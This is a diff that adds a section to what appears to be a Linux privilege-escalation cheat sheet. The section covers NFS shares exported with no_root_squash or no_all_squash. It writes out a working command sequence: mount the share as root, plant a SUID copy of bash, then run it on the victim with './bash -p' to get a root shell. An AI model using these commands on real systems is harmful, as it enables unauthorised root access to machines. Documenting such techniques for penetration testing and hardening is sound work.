@@ -58,7 +58,21 @@ int main(void) {
 
 
 ## NFS no_root_squash/no_all_squash misconfiguration PE
+This is a misconfiguration in the NFS configuration. If the options no_root_squash or no_all_squash are found in ```/etc/exports```, then you can access it from a client and write inside that directory as if you were the local root of the machine.
+```cmd
+#Attacker, as root user
+mkdir /tmp/pe
+mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
+cd /tmp/pe
+cp /bin/bash .
+chmod +s bash
 
+#Victim
+cd <SHAREDD_FOLDER>
+./bash -p #ROOT shell
+```
+Or using a **C SUID payloads** (see in [euid, ruid, suid])
+[NFS_privesc](https://www.errno.fr/nfs_privesc.html)
 
 ## Node inspector/CEF debug abuse
 
